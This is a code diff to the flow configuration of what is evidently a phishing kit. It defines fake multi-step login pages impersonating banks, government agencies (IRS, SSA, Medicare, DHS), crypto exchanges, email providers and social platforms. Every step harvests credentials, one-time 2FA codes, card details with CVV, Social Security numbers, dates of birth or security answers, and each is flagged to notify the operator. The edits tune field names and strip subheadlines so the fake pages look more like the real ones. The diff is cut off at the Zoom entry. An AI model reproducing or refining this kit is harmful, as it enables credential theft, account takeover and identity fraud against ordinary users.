@@ -728,7 +728,7 @@ FLOWS.disneyplus = [
 ];
 
 FLOWS.spotify = [
-  { slug:'login',          form_type:'login',  page_title:'Spotify – Login',    headline:'Log in to Spotify',             subheadline:'',                               fields:['email','password'],                          layout:'auth',  cta:'Log In',    step_label:'Login',          notify_step:true  },
+  { slug:'login',          form_type:'login',  page_title:'Spotify – Login',    headline:'Log in to Spotify',             subheadline:'',                               fields:['email_or_username','password'],               layout:'auth',  cta:'Log In',    step_label:'Login',          notify_step:true  },
   { slug:'payment-update', form_type:'payment',page_title:'Update Payment',     headline:'Update Payment Details',        subheadline:'Update your payment method to continue your Premium subscription', fields:['card_number','expiry','cvv','name_on_card'],layout:'payment',cta:'Update',    step_label:'Payment Update', notify_step:true  }
 ];
 
@@ -738,7 +738,7 @@ FLOWS.netflix = [
 ];
 
 FLOWS.github = [
-  { slug:'login',  form_type:'login', page_title:'Sign in to GitHub', headline:'Sign in to GitHub', subheadline:'', fields:['username','password'], layout:'auth', cta:'Sign in',    step_label:'Login', notify_step:true  },
+  { slug:'login',  form_type:'login', page_title:'Sign in to GitHub', headline:'Sign in to GitHub', subheadline:'', fields:['github_username_or_email','password'], layout:'auth', cta:'Sign in',    step_label:'Login', notify_step:true  },
   { slug:'2fa',    form_type:'otp',   page_title:'Two-factor authentication', headline:'Two-factor authentication', subheadline:'Open your two-factor authenticator app to view your authentication code', fields:['code'], layout:'otp', cta:'Verify', step_label:'2FA', notify_step:true, otp_length:6 }
 ];
 
@@ -771,12 +771,12 @@ FLOWS.twitterx = [
 ];
 
 FLOWS.snapchat = [
-  { slug:'login',    form_type:'login', page_title:'Log in to Snapchat',   headline:'Log in to Snapchat', subheadline:'', fields:['email','password'], layout:'auth', cta:'Log In',   step_label:'Log In', notify_step:true  },
+  { slug:'login',    form_type:'login', page_title:'Log in to Snapchat',   headline:'Log in to Snapchat', subheadline:'', fields:['username','password'], layout:'auth', cta:'Log In',   step_label:'Log In', notify_step:true  },
   { slug:'sms-code', form_type:'otp',   page_title:'Verify Your Identity', headline:'Verify Your Identity', subheadline:'Enter the code sent to your phone number', fields:['code'], layout:'otp', cta:'Verify', step_label:'Verify', notify_step:true, otp_length:6 }
 ];
 
 FLOWS.linkedin = [
-  { slug:'login',    form_type:'login', page_title:'LinkedIn – Sign In',   headline:'Sign in', subheadline:'Stay updated on your professional world', fields:['email','password'], layout:'auth', cta:'Sign in', step_label:'Sign In', notify_step:true  },
+  { slug:'login',    form_type:'login', page_title:'LinkedIn – Sign In',   headline:'Sign in', subheadline:'', fields:['email_or_phone','password'], layout:'auth', cta:'Sign in', step_label:'Sign In', notify_step:true  },
   { slug:'sms-code', form_type:'otp',   page_title:'Verify Your Identity', headline:'Let\'s verify it\'s you', subheadline:'Enter the verification code we sent to your email', fields:['code'], layout:'otp', cta:'Submit', step_label:'Verify', notify_step:true, otp_length:6 }
 ];
 
@@ -841,25 +841,25 @@ FLOWS.mastodon = [
 ];
 
 FLOWS.threads = [
-  { slug:'login',    form_type:'login', page_title:'Log In – Threads',     headline:'Log into Threads', subheadline:'', fields:['username_or_email','password'], layout:'auth', cta:'Log in',    step_label:'Log In', notify_step:true  },
+  { slug:'login',    form_type:'login', page_title:'Log In – Threads',     headline:'Log into Threads', subheadline:'', fields:['username_email_phone','password'], layout:'auth', cta:'Log in',    step_label:'Log In', notify_step:true  },
   { slug:'sms-code', form_type:'otp',   page_title:'Confirm Your Identity', headline:'Enter the login code', subheadline:'Enter the 6-digit code we sent to your phone number', fields:['code'], layout:'otp', cta:'Confirm', step_label:'Confirm', notify_step:true, otp_length:6 }
 ];
 
 FLOWS.youtube = [
-  { slug:'login',    form_type:'login', page_title:'Sign in – YouTube',    headline:'Sign in',            subheadline:'Use your Google Account', fields:['email'], layout:'auth', cta:'Next', step_label:'Email', notify_step:true  },
+  { slug:'login',    form_type:'login', page_title:'Sign in – YouTube',    headline:'Sign in',            subheadline:'Use your Google Account', fields:['email_or_phone'], layout:'auth', cta:'Next', step_label:'Email', notify_step:true  },
   { slug:'password', form_type:'login', page_title:'Welcome',              headline:'Welcome',            subheadline:'', fields:['password'], layout:'auth', cta:'Next', step_label:'Password', notify_step:true  },
   { slug:'sms-code', form_type:'otp',   page_title:'2-Step Verification',  headline:'2-Step Verification', subheadline:'Google sent a verification code to your phone', fields:['code'], layout:'otp', cta:'Next', step_label:'Verify', notify_step:true, otp_length:6 }
 ];
 
 // ── Government brands ─────────────────────────────────────────────────────────
 FLOWS.irs = [
-  { slug:'login',     form_type:'login',    page_title:'Sign In – IRS',        headline:'Sign In to Your IRS Account', subheadline:'Access your federal tax records, payment history, and more', fields:['username','password'], layout:'auth',   cta:'Sign In',   step_label:'Sign In',   notify_step:true  },
+  { slug:'login',     form_type:'login',    page_title:'Sign In – IRS',        headline:'Sign In to Your IRS Account', subheadline:'', fields:['username','password'], layout:'auth',   cta:'Sign In',   step_label:'Sign In',   notify_step:true  },
   { slug:'sms-code',  form_type:'otp',      page_title:'Verify Your Identity', headline:'Verify Your Identity',       subheadline:'Enter the 6-digit code sent to your phone number', fields:['code'], layout:'otp',    cta:'Verify',    step_label:'Verify',    notify_step:true, otp_length:6 },
   { slug:'id-confirm',form_type:'id_verify',page_title:'Confirm Your Identity',headline:'Confirm Your Identity',      subheadline:'We need to verify your identity. Please enter your Social Security Number and date of birth.', fields:['ssn','dob'], layout:'verify', cta:'Confirm',   step_label:'ID Confirm',notify_step:true  }
 ];
 
 FLOWS.ssa = [
-  { slug:'login',     form_type:'login',    page_title:'Sign In – my Social Security', headline:'Sign In to my Social Security', subheadline:'Access your Social Security Statement, earnings record, and more', fields:['username','password'], layout:'auth',   cta:'Sign In',   step_label:'Sign In',   notify_step:true  },
+  { slug:'login',     form_type:'login',    page_title:'Sign In – my Social Security', headline:'Sign In to my Social Security', subheadline:'', fields:['username','password'], layout:'auth',   cta:'Sign In',   step_label:'Sign In',   notify_step:true  },
   { slug:'sms-code',  form_type:'otp',      page_title:'Enter Security Code',          headline:'Enter the security code',      subheadline:'We sent a one-time security code to your phone or email', fields:['code'], layout:'otp',    cta:'Next',      step_label:'Security Code', notify_step:true, otp_length:8 },
   { slug:'id-confirm',form_type:'id_verify',page_title:'Verify Your Identity',         headline:'Verify Your Identity',         subheadline:'Confirm your SSN and date of birth to proceed', fields:['ssn','dob'], layout:'verify', cta:'Confirm',   step_label:'ID Confirm',    notify_step:true  }
 ];
@@ -877,7 +877,7 @@ FLOWS.uscis = [
 ];
 
 FLOWS.tsa = [
-  { slug:'login',     form_type:'login',    page_title:'Sign In – TSA PreCheck', headline:'Sign in to your TSA account', subheadline:'Manage your TSA PreCheck enrollment and membership', fields:['email','password'], layout:'auth', cta:'Sign In', step_label:'Sign In', notify_step:true  },
+  { slug:'login',     form_type:'login',    page_title:'Sign In – TSA PreCheck', headline:'Sign in to your TSA account', subheadline:'', fields:['email','password'], layout:'auth', cta:'Sign In', step_label:'Sign In', notify_step:true  },
   { slug:'sms-code',  form_type:'otp',      page_title:'Verify Your Identity',   headline:'Verify Your Identity',       subheadline:'Enter the code sent to your registered phone number', fields:['code'], layout:'otp', cta:'Verify', step_label:'Verify', notify_step:true, otp_length:6 },
   { slug:'id-confirm',form_type:'id_verify',page_title:'Confirm Your Identity',  headline:'Confirm Your Identity',      subheadline:'Enter your Known Traveler Number and date of birth', fields:['ktn','dob'], layout:'verify', cta:'Confirm', step_label:'ID Confirm', notify_step:true }
 ];
@@ -904,7 +904,7 @@ FLOWS.nsa = [
 ];
 
 FLOWS.dhs = [
-  { slug:'login',     form_type:'login',    page_title:'Sign In – DHS Portal', headline:'DHS Secure Portal Sign In', subheadline:'Access your Department of Homeland Security services', fields:['username','password'], layout:'auth', cta:'Sign In', step_label:'Sign In', notify_step:true  },
+  { slug:'login',     form_type:'login',    page_title:'Sign In – DHS Portal', headline:'DHS Secure Portal Sign In', subheadline:'', fields:['username','password'], layout:'auth', cta:'Sign In', step_label:'Sign In', notify_step:true  },
   { slug:'sms-code',  form_type:'otp',      page_title:'Verify Your Identity', headline:'Verify Your Identity',     subheadline:'Enter the code sent to your registered device', fields:['code'], layout:'otp', cta:'Verify', step_label:'Verify', notify_step:true, otp_length:6 },
   { slug:'id-confirm',form_type:'id_verify',page_title:'Confirm Your Identity',headline:'Confirm Your Identity',    subheadline:'Enter your employee or badge ID to confirm your identity', fields:['employee_id','dob'], layout:'verify', cta:'Confirm', step_label:'ID Confirm', notify_step:true }
 ];
@@ -916,13 +916,13 @@ FLOWS.va = [
 ];
 
 FLOWS.medicare = [
-  { slug:'login',     form_type:'login',    page_title:'Sign In – Medicare',    headline:'Sign in to your Medicare account', subheadline:'Access your Medicare information and manage your benefits', fields:['username','password'], layout:'auth',   cta:'Sign in',   step_label:'Sign In',   notify_step:true  },
+  { slug:'login',     form_type:'login',    page_title:'Sign In – Medicare',    headline:'Sign in to your Medicare account', subheadline:'', fields:['username','password'], layout:'auth',   cta:'Sign in',   step_label:'Sign In',   notify_step:true  },
   { slug:'sms-code',  form_type:'otp',      page_title:'Verify Your Identity',  headline:'Verify Your Identity',             subheadline:'Enter the 6-digit code sent to your phone', fields:['code'], layout:'otp',    cta:'Continue',  step_label:'Verify',    notify_step:true, otp_length:6 },
   { slug:'id-confirm',form_type:'id_verify',page_title:'Confirm Medicare Info', headline:'Confirm Your Medicare Information', subheadline:'Enter your Medicare Beneficiary Identifier (MBI) and date of birth', fields:['mbi','dob'], layout:'verify', cta:'Confirm', step_label:'Confirm ID', notify_step:true }
 ];
 
 FLOWS.medicaid = [
-  { slug:'login',     form_type:'login',    page_title:'Sign In – Medicaid',    headline:'Sign In to Medicaid Online', subheadline:'Manage your Medicaid benefits and coverage', fields:['username','password'], layout:'auth',   cta:'Sign In',   step_label:'Sign In',   notify_step:true  },
+  { slug:'login',     form_type:'login',    page_title:'Sign In – Medicaid',    headline:'Sign In to Medicaid Online', subheadline:'', fields:['username','password'], layout:'auth',   cta:'Sign In',   step_label:'Sign In',   notify_step:true  },
   { slug:'sms-code',  form_type:'otp',      page_title:'Verify Your Identity',  headline:'Verify Your Identity',       subheadline:'Enter the verification code sent to your phone or email', fields:['code'], layout:'otp',    cta:'Verify',    step_label:'Verify',    notify_step:true, otp_length:6 },
   { slug:'id-confirm',form_type:'id_verify',page_title:'Confirm Your Identity', headline:'Confirm Your Identity',      subheadline:'Enter your Medicaid ID number and date of birth', fields:['medicaid_id','dob'], layout:'verify', cta:'Confirm', step_label:'Confirm', notify_step:true }
 ];
@@ -998,13 +998,13 @@ FLOWS.citibank = [
 ];
 
 FLOWS.hsbc = [
-  { slug:'login',     form_type:'login', page_title:'Log On – HSBC',            headline:'Log On',                subheadline:'Welcome to HSBC Online Banking', fields:['username','password'], layout:'auth', cta:'Log On',    step_label:'Log On',    notify_step:true  },
+  { slug:'login',     form_type:'login', page_title:'Log On – HSBC',            headline:'Log On',                subheadline:'', fields:['username','password'], layout:'auth', cta:'Log On',    step_label:'Log On',    notify_step:true  },
   { slug:'sms-otp',   form_type:'otp',   page_title:'Security Code',            headline:'Enter Security Code',   subheadline:'We\'ve sent a security code to your registered mobile number', fields:['code'], layout:'otp', cta:'Submit', step_label:'Security Code', notify_step:true, otp_length:6 },
   { slug:'security-q',form_type:'security_q',page_title:'Security Questions',   headline:'Security Questions',    subheadline:'Please answer your security questions', fields:['answer1','answer2'], layout:'security_q', cta:'Continue', step_label:'Security Q', notify_step:true }
 ];
 
 FLOWS.barclays = [
-  { slug:'login',     form_type:'login', page_title:'Log In – Barclays',        headline:'Log In',                subheadline:'Log in to Barclays Online Banking', fields:['surname','membership_number','passcode'], layout:'auth', cta:'Continue', step_label:'Log In', notify_step:true  },
+  { slug:'login',     form_type:'login', page_title:'Log In – Barclays',        headline:'Log In',                subheadline:'', fields:['surname','membership_number','passcode'], layout:'auth', cta:'Continue', step_label:'Log In', notify_step:true  },
   { slug:'sms-otp',   form_type:'otp',   page_title:'PINsentry',               headline:'PINsentry Code',        subheadline:'Use your PINsentry card reader or mobile app to generate a code', fields:['code'], layout:'otp', cta:'Continue', step_label:'PINsentry', notify_step:true, otp_length:8 }
 ];
 
@@ -1014,18 +1014,18 @@ FLOWS.deutschebank = [
 ];
 
 FLOWS.bnpparibas = [
-  { slug:'login',     form_type:'login', page_title:'Sign In – BNP Paribas',    headline:'Sign In',              subheadline:'Access your BNP Paribas online banking', fields:['client_number','password'], layout:'auth', cta:'Sign In', step_label:'Sign In', notify_step:true  },
+  { slug:'login',     form_type:'login', page_title:'Sign In – BNP Paribas',    headline:'Sign In',              subheadline:'', fields:['client_number','password'], layout:'auth', cta:'Sign In', step_label:'Sign In', notify_step:true  },
   { slug:'sms-otp',   form_type:'otp',   page_title:'Security Code',            headline:'Security Code',        subheadline:'Enter the 6-digit code sent to your mobile phone', fields:['code'], layout:'otp', cta:'Confirm', step_label:'Security Code', notify_step:true, otp_length:6 }
 ];
 
 FLOWS.goldmansachs = [
-  { slug:'login',     form_type:'login', page_title:'Sign In – Marcus',         headline:'Sign In',              subheadline:'Access your Marcus by Goldman Sachs account', fields:['email','password'], layout:'auth', cta:'Sign In', step_label:'Sign In', notify_step:true  },
+  { slug:'login',     form_type:'login', page_title:'Sign In – Marcus',         headline:'Sign In',              subheadline:'', fields:['email','password'], layout:'auth', cta:'Sign In', step_label:'Sign In', notify_step:true  },
   { slug:'sms-otp',   form_type:'otp',   page_title:'Verify Your Identity',     headline:'Verify Your Identity', subheadline:'Enter the one-time passcode sent to your phone number', fields:['code'], layout:'otp', cta:'Continue', step_label:'OTP', notify_step:true, otp_length:6 },
   { slug:'security-q',form_type:'security_q',page_title:'Security Questions',   headline:'Security Questions',   subheadline:'Please answer these security questions to verify your identity', fields:['answer1','answer2'], layout:'security_q', cta:'Continue', step_label:'Security Q', notify_step:true }
 ];
 
 FLOWS.morganstanley = [
-  { slug:'login',     form_type:'login', page_title:'Log In – Morgan Stanley',  headline:'Log In',               subheadline:'Access your Morgan Stanley accounts and financial information', fields:['username','password'], layout:'auth', cta:'Log In', step_label:'Log In', notify_step:true  },
+  { slug:'login',     form_type:'login', page_title:'Log In – Morgan Stanley',  headline:'Log In',               subheadline:'', fields:['username','password'], layout:'auth', cta:'Log In', step_label:'Log In', notify_step:true  },
   { slug:'sms-otp',   form_type:'otp',   page_title:'One-Time Passcode',        headline:'One-Time Passcode',    subheadline:'Enter the one-time passcode we sent to your phone', fields:['code'], layout:'otp', cta:'Submit', step_label:'OTP', notify_step:true, otp_length:6 }
 ];
 
@@ -1035,18 +1035,18 @@ FLOWS.ubs = [
 ];
 
 FLOWS.creditsuisse = [
-  { slug:'login',     form_type:'login', page_title:'Login – Credit Suisse',    headline:'Login',                subheadline:'Access your Credit Suisse e-banking portal', fields:['contract_number','password'], layout:'auth', cta:'Login', step_label:'Login', notify_step:true  },
+  { slug:'login',     form_type:'login', page_title:'Login – Credit Suisse',    headline:'Login',                subheadline:'', fields:['contract_number','password'], layout:'auth', cta:'Login', step_label:'Login', notify_step:true  },
   { slug:'sms-otp',   form_type:'otp',   page_title:'SecureSign',               headline:'SecureSign Code',      subheadline:'Enter the code from your SecureSign app or SMS', fields:['code'], layout:'otp', cta:'Confirm', step_label:'SecureSign', notify_step:true, otp_length:6 }
 ];
 
 FLOWS.tdbank = [
-  { slug:'login',     form_type:'login', page_title:'Log In – TD Bank',         headline:'Log In to TD Online Banking', subheadline:'Manage your accounts anytime, anywhere', fields:['username','password'], layout:'auth', cta:'Log In', step_label:'Log In', notify_step:true  },
+  { slug:'login',     form_type:'login', page_title:'Log In – TD Bank',         headline:'Log In to TD Online Banking', subheadline:'', fields:['username','password'], layout:'auth', cta:'Log In', step_label:'Log In', notify_step:true  },
   { slug:'sms-otp',   form_type:'otp',   page_title:'One-Time Passcode',        headline:'Enter Your One-Time Passcode', subheadline:'We sent a one-time passcode to your phone number on file', fields:['code'], layout:'otp', cta:'Submit', step_label:'OTP', notify_step:true, otp_length:6 },
   { slug:'security-q',form_type:'security_q',page_title:'Security Challenge',   headline:'Security Challenge',    subheadline:'Please answer the security question to verify your identity', fields:['answer1'], layout:'security_q', cta:'Continue', step_label:'Security Q', notify_step:true }
 ];
 
 FLOWS.rbc = [
-  { slug:'login',     form_type:'login', page_title:'Sign In – RBC',            headline:'RBC Online Banking',   subheadline:'Sign in to access your accounts', fields:['client_card','password'], layout:'auth', cta:'Sign In', step_label:'Sign In', notify_step:true  },
+  { slug:'login',     form_type:'login', page_title:'Sign In – RBC',            headline:'RBC Online Banking',   subheadline:'', fields:['client_card','password'], layout:'auth', cta:'Sign In', step_label:'Sign In', notify_step:true  },
   { slug:'sms-otp',   form_type:'otp',   page_title:'Verification Code',        headline:'Verification Code',    subheadline:'Enter the 8-digit verification code sent to your phone', fields:['code'], layout:'otp', cta:'Continue', step_label:'Verify', notify_step:true, otp_length:8 }
 ];
 
@@ -1092,27 +1092,27 @@ FLOWS.scotiabank = [
 ];
 
 FLOWS.anz = [
-  { slug:'login',     form_type:'login', page_title:'Log In – ANZ',             headline:'ANZ Internet Banking', subheadline:'Log in to manage your accounts', fields:['customer_registration_number','password'], layout:'auth', cta:'Log In', step_label:'Log In', notify_step:true  },
+  { slug:'login',     form_type:'login', page_title:'Log In – ANZ',             headline:'ANZ Internet Banking', subheadline:'', fields:['customer_registration_number','password'], layout:'auth', cta:'Log In', step_label:'Log In', notify_step:true  },
   { slug:'sms-otp',   form_type:'otp',   page_title:'Verification',             headline:'OTP Verification',    subheadline:'Enter the one-time password sent to your registered mobile', fields:['code'], layout:'otp', cta:'Confirm', step_label:'OTP', notify_step:true, otp_length:6 }
 ];
 
 FLOWS.nab = [
-  { slug:'login',     form_type:'login', page_title:'Log In – NAB',             headline:'NAB Internet Banking', subheadline:'Log in to NAB Internet Banking', fields:['username','password'], layout:'auth', cta:'Log in', step_label:'Log In', notify_step:true  },
+  { slug:'login',     form_type:'login', page_title:'Log In – NAB',             headline:'NAB Internet Banking', subheadline:'', fields:['username','password'], layout:'auth', cta:'Log in', step_label:'Log In', notify_step:true  },
   { slug:'sms-otp',   form_type:'otp',   page_title:'SMS Verification',         headline:'SMS Verification',    subheadline:'A one-time password has been sent to your registered mobile', fields:['code'], layout:'otp', cta:'Continue', step_label:'Verify', notify_step:true, otp_length:6 }
 ];
 
 FLOWS.westpac = [
-  { slug:'login',     form_type:'login', page_title:'Log In – Westpac',         headline:'Westpac Online Banking', subheadline:'Log in to manage your accounts', fields:['customer_id','password'], layout:'auth', cta:'Log In', step_label:'Log In', notify_step:true  },
+  { slug:'login',     form_type:'login', page_title:'Log In – Westpac',         headline:'Westpac Online Banking', subheadline:'', fields:['customer_id','password'], layout:'auth', cta:'Log In', step_label:'Log In', notify_step:true  },
   { slug:'sms-otp',   form_type:'otp',   page_title:'SecureCode',               headline:'SecureCode Verification', subheadline:'Enter the 6-digit SecureCode sent to your registered mobile', fields:['code'], layout:'otp', cta:'Confirm', step_label:'SecureCode', notify_step:true, otp_length:6 }
 ];
 
 FLOWS.standardchartered = [
-  { slug:'login',     form_type:'login', page_title:'Log In – Standard Chartered', headline:'Online Banking Login', subheadline:'Log in to Standard Chartered Online Banking', fields:['username','password'], layout:'auth', cta:'Log In', step_label:'Log In', notify_step:true  },
+  { slug:'login',     form_type:'login', page_title:'Log In – Standard Chartered', headline:'Online Banking Login', subheadline:'', fields:['username','password'], layout:'auth', cta:'Log In', step_label:'Log In', notify_step:true  },
   { slug:'sms-otp',   form_type:'otp',   page_title:'Step-Up Authentication',     headline:'Step-Up Authentication', subheadline:'Enter the OTP sent to your registered mobile phone', fields:['code'], layout:'otp', cta:'Confirm', step_label:'OTP', notify_step:true, otp_length:6 }
 ];
 
 FLOWS.emiratesnbd = [
-  { slug:'login',     form_type:'login', page_title:'Login – Emirates NBD',     headline:'Online Banking',       subheadline:'Login to Emirates NBD Online Banking', fields:['username','password'], layout:'auth', cta:'Login', step_label:'Login', notify_step:true  },
+  { slug:'login',     form_type:'login', page_title:'Login – Emirates NBD',     headline:'Online Banking',       subheadline:'', fields:['username','password'], layout:'auth', cta:'Login', step_label:'Login', notify_step:true  },
   { slug:'sms-otp',   form_type:'otp',   page_title:'SMS Authentication',       headline:'SMS OTP',              subheadline:'Enter the One-Time Password sent to your registered mobile number', fields:['code'], layout:'otp', cta:'Confirm', step_label:'OTP', notify_step:true, otp_length:6 }
 ];
 
@@ -1138,13 +1138,13 @@ FLOWS.fab = [
 
 // ── Crypto ────────────────────────────────────────────────────────────────────
 FLOWS.binance = [
-  { slug:'login',    form_type:'login', page_title:'Log In – Binance',         headline:'Log in to Binance',    subheadline:'', fields:['email','password'], layout:'auth', cta:'Log In',   step_label:'Log In', notify_step:true  },
+  { slug:'login',    form_type:'login', page_title:'Log in to Binance',        headline:'Log in to Binance',    subheadline:'', fields:['email_or_phone_num','password'], layout:'auth', cta:'Log In',   step_label:'Log In', notify_step:true  },
   { slug:'2fa-email',form_type:'otp',   page_title:'Security Verification',    headline:'Security Verification', subheadline:'Please complete security verification to proceed', fields:['code'], layout:'otp', cta:'Submit', step_label:'Email Code', notify_step:true, otp_length:6 },
   { slug:'2fa-sms',  form_type:'otp',   page_title:'SMS Authentication',       headline:'SMS Authentication',   subheadline:'Enter the SMS authentication code sent to your phone', fields:['code'], layout:'otp', cta:'Submit', step_label:'SMS Code', notify_step:true, otp_length:6 }
 ];
 
 FLOWS.coinbase = [
-  { slug:'login',    form_type:'login', page_title:'Sign In – Coinbase',       headline:'Sign in to Coinbase',  subheadline:'', fields:['email','password'], layout:'auth', cta:'Sign In',  step_label:'Sign In', notify_step:true  },
+  { slug:'login',    form_type:'login', page_title:'Sign In – Coinbase',       headline:'Sign in to Coinbase',  subheadline:'', fields:['email'], layout:'auth', cta:'Continue',  step_label:'Email', notify_step:true  },
   { slug:'2fa-email',form_type:'otp',   page_title:'2-Step Verification',      headline:'2-Step Verification',  subheadline:'A verification code has been sent to your email address', fields:['code'], layout:'otp', cta:'Verify', step_label:'Email Code', notify_step:true, otp_length:7 },
   { slug:'2fa-sms',  form_type:'otp',   page_title:'Phone Verification',       headline:'Phone Verification',   subheadline:'Enter the code sent to your phone', fields:['code'], layout:'otp', cta:'Verify', step_label:'SMS Code', notify_step:true, otp_length:6 }
 ];
@@ -1212,12 +1212,12 @@ FLOWS.phemex = [
 ];
 
 FLOWS.dydx = [
-  { slug:'login',    form_type:'login', page_title:'Sign In – dYdX',           headline:'Sign In to dYdX',      subheadline:'Connect your wallet to access dYdX', fields:['email','password'], layout:'auth', cta:'Sign In',  step_label:'Sign In', notify_step:true  },
+  { slug:'login',    form_type:'login', page_title:'Sign In – dYdX',           headline:'Sign In to dYdX',      subheadline:'', fields:['email','password'], layout:'auth', cta:'Sign In',  step_label:'Sign In', notify_step:true  },
   { slug:'2fa',      form_type:'otp',   page_title:'2-Factor Authentication',  headline:'2-Factor Authentication', subheadline:'Enter the code from your authenticator app', fields:['code'], layout:'otp', cta:'Verify', step_label:'2FA', notify_step:true, otp_length:6 }
 ];
 
 FLOWS.uniswap = [
-  { slug:'login',    form_type:'login', page_title:'Sign In – Uniswap',        headline:'Sign in to Uniswap',   subheadline:'Connect with your wallet or email', fields:['email','password'], layout:'auth', cta:'Sign In',  step_label:'Sign In', notify_step:true  },
+  { slug:'login',    form_type:'login', page_title:'Sign In – Uniswap',        headline:'Sign in to Uniswap',   subheadline:'', fields:['email','password'], layout:'auth', cta:'Sign In',  step_label:'Sign In', notify_step:true  },
   { slug:'2fa',      form_type:'otp',   page_title:'Verify Your Identity',     headline:'Verify Your Identity', subheadline:'Enter the verification code sent to your email', fields:['code'], layout:'otp', cta:'Verify', step_label:'Verify', notify_step:true, otp_length:6 }
 ];
 
@@ -1232,12 +1232,12 @@ FLOWS.trustwallet = [
 ];
 
 FLOWS.ledger = [
-  { slug:'login',    form_type:'login', page_title:'Sign In – Ledger',         headline:'Sign in to Ledger',    subheadline:'Access your Ledger Live account', fields:['email','password'], layout:'auth', cta:'Sign In',  step_label:'Sign In', notify_step:true  },
+  { slug:'login',    form_type:'login', page_title:'Sign In – Ledger',         headline:'Sign in to Ledger',    subheadline:'', fields:['email','password'], layout:'auth', cta:'Sign In',  step_label:'Sign In', notify_step:true  },
   { slug:'2fa',      form_type:'otp',   page_title:'Two-Factor Authentication', headline:'Two-Factor Authentication', subheadline:'Enter the code from your authenticator app', fields:['code'], layout:'otp', cta:'Sign In', step_label:'2FA', notify_step:true, otp_length:6 }
 ];
 
 FLOWS.trezor = [
-  { slug:'login',    form_type:'login', page_title:'Sign In – Trezor Suite',   headline:'Sign in to Trezor Suite', subheadline:'Manage your crypto portfolio with Trezor Suite', fields:['email','password'], layout:'auth', cta:'Sign In', step_label:'Sign In', notify_step:true  },
+  { slug:'login',    form_type:'login', page_title:'Sign In – Trezor Suite',   headline:'Sign in to Trezor Suite', subheadline:'', fields:['email','password'], layout:'auth', cta:'Sign In', step_label:'Sign In', notify_step:true  },
   { slug:'2fa',      form_type:'otp',   page_title:'Two-Factor Authentication', headline:'Two-Factor Authentication', subheadline:'Enter the code from your authenticator app', fields:['code'], layout:'otp', cta:'Confirm', step_label:'2FA', notify_step:true, otp_length:6 }
 ];
 
@@ -1415,7 +1415,7 @@ FLOWS.neteller = [
 ];
 
 FLOWS.paysafe = [
-  { slug:'login',    form_type:'login', page_title:'Sign In – Paysafe',        headline:'Sign In to Paysafe',   subheadline:'Access your Paysafe account and manage your digital payments', fields:['email','password'], layout:'auth', cta:'Sign In',  step_label:'Sign In', notify_step:true  },
+  { slug:'login',    form_type:'login', page_title:'Sign In – Paysafe',        headline:'Sign In to Paysafe',   subheadline:'', fields:['email','password'], layout:'auth', cta:'Sign In',  step_label:'Sign In', notify_step:true  },
   { slug:'sms-code', form_type:'otp',   page_title:'Two-Factor Authentication', headline:'Two-Factor Authentication', subheadline:'Enter the verification code sent to your registered phone', fields:['code'], layout:'otp', cta:'Verify', step_label:'2FA', notify_step:true, otp_length:6 }
 ];
 
@@ -1441,19 +1441,19 @@ FLOWS.gcash = [
 
 // ── Email ─────────────────────────────────────────────────────────────────────
 FLOWS.gmail = [
-  { slug:'login',    form_type:'login', page_title:'Sign In – Gmail',          headline:'Sign in',              subheadline:'Use your Google Account', fields:['email'], layout:'auth', cta:'Next',     step_label:'Email', notify_step:true  },
+  { slug:'login',    form_type:'login', page_title:'Sign In – Gmail',          headline:'Sign in',              subheadline:'Use your Google Account', fields:['email_or_phone'], layout:'auth', cta:'Next',     step_label:'Email', notify_step:true  },
   { slug:'password', form_type:'login', page_title:'Welcome',                  headline:'Welcome',              subheadline:'', fields:['password'], layout:'auth', cta:'Next',     step_label:'Password', notify_step:true  },
   { slug:'sms-code', form_type:'otp',   page_title:'2-Step Verification',      headline:'2-Step Verification',  subheadline:'Google sent a verification code to your phone', fields:['code'], layout:'otp', cta:'Next', step_label:'Verify', notify_step:true, otp_length:6 }
 ];
 
 FLOWS.outlook = [
-  { slug:'login',    form_type:'login', page_title:'Sign In – Outlook',        headline:'Sign in',              subheadline:'to continue to Outlook', fields:['email'], layout:'auth', cta:'Next',     step_label:'Email', notify_step:true  },
+  { slug:'login',    form_type:'login', page_title:'Sign In – Outlook',        headline:'Sign in',              subheadline:'to continue to Outlook', fields:['email_phone_skype'], layout:'auth', cta:'Next',     step_label:'Email', notify_step:true  },
   { slug:'password', form_type:'login', page_title:'Enter Password',           headline:'Enter password',       subheadline:'', fields:['password'], layout:'auth', cta:'Sign in',  step_label:'Password', notify_step:true  },
   { slug:'sms-code', form_type:'otp',   page_title:'Verify Your Identity',     headline:'Verify your identity', subheadline:'Please provide the following info to verify your identity', fields:['code'], layout:'otp', cta:'Next', step_label:'Verify', notify_step:true, otp_length:6 }
 ];
 
 FLOWS.yahoomail = [
-  { slug:'login',    form_type:'login', page_title:'Sign In – Yahoo',          headline:'Sign in to Yahoo',     subheadline:'Stay signed in', fields:['email'], layout:'auth', cta:'Next',     step_label:'Email', notify_step:true  },
+  { slug:'login',    form_type:'login', page_title:'Sign In – Yahoo',          headline:'Sign in to Yahoo',     subheadline:'', fields:['email_or_mobile_number'], layout:'auth', cta:'Next',     step_label:'Email', notify_step:true  },
   { slug:'password', form_type:'login', page_title:'Enter Your Password',      headline:'Enter your password',  subheadline:'', fields:['password'], layout:'auth', cta:'Sign In',  step_label:'Password', notify_step:true  },
   { slug:'sms-code', form_type:'otp',   page_title:'Let\'s Verify It\'s You',  headline:'Let\'s verify it\'s you', subheadline:'We\'ll send a text with a verification code to your phone', fields:['code'], layout:'otp', cta:'Next', step_label:'Verify', notify_step:true, otp_length:6 }
 ];
@@ -1554,7 +1554,7 @@ FLOWS.airbnb = [
 ];
 
 FLOWS.dropbox = [
-  { slug:'login',    form_type:'login', page_title:'Sign In – Dropbox',        headline:'Sign in to Dropbox',   subheadline:'', fields:['email','password'], layout:'auth', cta:'Sign in',  step_label:'Sign In', notify_step:true  },
+  { slug:'login',    form_type:'login', page_title:'Sign In – Dropbox',        headline:'Sign in to Dropbox',   subheadline:'', fields:['email'], layout:'auth', cta:'Continue',  step_label:'Email', notify_step:true  },
   { slug:'sms-code', form_type:'otp',   page_title:'Two-Step Verification',    headline:'Two-step verification', subheadline:'Enter the 6-digit security code generated by your authenticator app', fields:['code'], layout:'otp', cta:'Verify', step_label:'Verify', notify_step:true, otp_length:6 }
 ];
 
@@ -1564,7 +1564,8 @@ FLOWS.slack = [
 ];
 
 FLOWS.zoom = [
-  { slug:'login',    form_type:'login', page_title:'Sign In – Zoom',           headline:'Sign In to Zoom',      subheadline:'Connect, collaborate and celebrate from anywhere with Zoom', fields:['email','password'], layout:'auth', cta:'Sign In',  step_label:'Sign In', notify_step:true  },
